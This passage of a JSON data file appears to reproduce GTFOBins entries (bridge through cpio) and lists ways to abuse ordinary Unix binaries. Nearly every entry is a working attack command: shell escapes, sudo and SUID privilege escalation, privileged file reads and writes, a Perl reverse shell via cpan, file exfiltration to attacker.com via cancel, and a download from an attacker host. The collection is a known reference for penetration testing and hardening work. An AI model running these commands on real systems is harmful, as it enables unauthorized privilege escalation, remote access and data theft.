        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo bridge -b \"$LFILE\""
      }
    ]
  },
  {
    "id": 26,
    "bin": "bundle",
    "url": "/gtfobins/bundle/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be  less, other functions may apply.\nbundle help\n!/bin/sh\n\n\nexport BUNDLE_GEMFILE=x\nbundle exec /bin/sh\n\n\nTF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh\n\n\nThis spawns an interactive shell via irb.\nTF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle console\nsystem('/bin/sh -c /bin/sh')\n\n\nTF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundle install\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be  less, other functions may apply.\nsudo bundle help\n!/bin/sh"
      }
    ]
  },
  {
    "id": 27,
    "bin": "bundler",
    "url": "/gtfobins/bundler/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be  less, other functions may apply.\nbundler help\n!/bin/sh\n\n\nexport BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n\n\nTF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n\n\nThis spawns an interactive shell via irb.\nTF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n\n\nTF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be  less, other functions may apply.\nsudo bundler help\n!/bin/sh"
      }
    ]
  },
  {
    "id": 28,
    "bin": "busctl",
    "url": "/gtfobins/busctl/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nbusctl --show-machine\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo busctl --show-machine\n!/bin/sh"
      }
    ]
  },
  {
    "id": 29,
    "bin": "busybox",
    "url": "/gtfobins/busybox/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nbusybox sh\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nServe files in the local folder running an HTTP server.\nLPORT=12345\nbusybox httpd -f -p $LPORT -h .\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\n./busybox cat \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nIt may drop the SUID privileges depending on the compilation flags and the runtime configuration.\nsudo install -m =xs $(which busybox) .\n\n./busybox sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo busybox sh"
      }
    ]
  },
  {
    "id": 30,
    "bin": "byebug",
    "url": "/gtfobins/byebug/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which byebug) .\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue"
      }
    ]
  },
  {
    "id": 31,
    "bin": "bzip2",
    "url": "/gtfobins/bzip2/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which bzip2) .\n\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d"
      }
    ]
  },
  {
    "id": 32,
    "bin": "c89",
    "url": "/gtfobins/c89/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nc89 -wrapper /bin/sh,-s .\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nc89 -x c -E \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo c89 -wrapper /bin/sh,-s ."
      }
    ]
  },
  {
    "id": 33,
    "bin": "c99",
    "url": "/gtfobins/c99/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nc99 -wrapper /bin/sh,-s .\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nc99 -x c -E \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo c99 -wrapper /bin/sh,-s ."
      }
    ]
  },
  {
    "id": 34,
    "bin": "cancel",
    "url": "/gtfobins/cancel/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"
      }
    ]
  },
  {
    "id": 35,
    "bin": "capsh",
    "url": "/gtfobins/capsh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncapsh --\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which capsh) .\n\n./capsh --gid=0 --uid=0 --\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo capsh --"
      }
    ]
  },
  {
    "id": 36,
    "bin": "cat",
    "url": "/gtfobins/cat/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncat \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cat) .\n\nLFILE=file_to_read\n./cat \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo cat \"$LFILE\""
      }
    ]
  },
  {
    "id": 37,
    "bin": "cdist",
    "url": "/gtfobins/cdist/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncdist shell -s /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo cdist shell -s /bin/sh"
      }
    ]
  },
  {
    "id": 38,
    "bin": "certbot",
    "url": "/gtfobins/certbot/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
      }
    ]
  },
  {
    "id": 39,
    "bin": "check_by_ssh",
    "url": "/gtfobins/check_by_ssh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThe shell will only last 10 seconds.\ncheck_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe shell will only last 10 seconds.\nsudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
      }
    ]
  },
  {
    "id": 40,
    "bin": "check_cups",
    "url": "/gtfobins/check_cups/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE"
      }
    ]
  },
  {
    "id": 41,
    "bin": "check_log",
    "url": "/gtfobins/check_log/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE"
      }
    ]
  },
  {
    "id": 42,
    "bin": "check_memory",
    "url": "/gtfobins/check_memory/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE"
      }
    ]
  },
  {
    "id": 43,
    "bin": "check_raid",
    "url": "/gtfobins/check_raid/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE"
      }
    ]
  },
  {
    "id": 44,
    "bin": "check_ssl_cert",
    "url": "/gtfobins/check_ssl_cert/",
    "funcs": [
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nThe host example.net must return a certificate via TLS\nCOMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe host example.net must return a certificate via TLS\nCOMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"
      }
    ]
  },
  {
    "id": 45,
    "bin": "check_statusfile",
    "url": "/gtfobins/check_statusfile/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncheck_statusfile $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo check_statusfile $LFILE"
      }
    ]
  },
  {
    "id": 46,
    "bin": "chmod",
    "url": "/gtfobins/chmod/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which chmod) .\n\nLFILE=file_to_change\n./chmod 6777 $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_change\nsudo chmod 6777 $LFILE"
      }
    ]
  },
  {
    "id": 47,
    "bin": "choom",
    "url": "/gtfobins/choom/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nchoom -n 0 /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which choom) .\n\n./choom -n 0 -- /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo choom -n 0 /bin/sh"
      }
    ]
  },
  {
    "id": 48,
    "bin": "chown",
    "url": "/gtfobins/chown/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which chown) .\n\nLFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"
      }
    ]
  },
  {
    "id": 49,
    "bin": "chroot",
    "url": "/gtfobins/chroot/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which chroot) .\n\n./chroot / /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo chroot /"
      }
    ]
  },
  {
    "id": 50,
    "bin": "cmp",
    "url": "/gtfobins/cmp/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncmp $LFILE /dev/zero -b -l\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cmp) .\n\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l"
      }
    ]
  },
  {
    "id": 51,
    "bin": "cobc",
    "url": "/gtfobins/cobc/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"
      }
    ]
  },
  {
    "id": 52,
    "bin": "column",
    "url": "/gtfobins/column/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncolumn $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which column) .\n\nLFILE=file_to_read\n./column $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo column $LFILE"
      }
    ]
  },
  {
    "id": 53,
    "bin": "comm",
    "url": "/gtfobins/comm/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which comm) .\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null"
      }
    ]
  },
  {
    "id": 54,
    "bin": "composer",
    "url": "/gtfobins/composer/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which composer) .\n\nTF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x"
      }
    ]
  },
  {
    "id": 55,
    "bin": "cowsay",
    "url": "/gtfobins/cowsay/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x"
      }
    ]
  },
  {
    "id": 56,
    "bin": "cowthink",
    "url": "/gtfobins/cowthink/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x"
      }
    ]
  },
  {
    "id": 57,
    "bin": "cp",
    "url": "/gtfobins/cp/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n\n\nThis can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)\nsudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n\n\nThis can copy SUID permissions from any SUID binary (e.g., cp itself) to another.\nsudo install -m =xs $(which cp) .\n\nLFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\n\nThis can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n\nThis overrides cp itself with a shell (or any other executable) that is to be executed as root, useful in case a sudo rule allows to only run cp by path. Warning, this is a destructive action.\nsudo cp /bin/sh /bin/cp\nsudo cp"
      }
    ]
  },
  {
    "id": 58,
    "bin": "cpan",
    "url": "/gtfobins/cpan/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncpan lets you execute perl commands with the ! command.\ncpan\n! exec '/bin/bash'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -lvp RPORT on the attacker box to receive the shell.\nexport RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nServe files in the local folder running an HTTP server on port 8080. Install the dependency via cpan HTTP::Server::Simple.\ncpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via an HTTP GET request and store it in PWD.\nexport URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo cpan\n! exec '/bin/bash'"
      }
    ]
  },
  {
    "id": 59,
    "bin": "cpio",
    "url": "/gtfobins/cpio/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\necho '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n\n"
      },
      {
        "func": "File write",
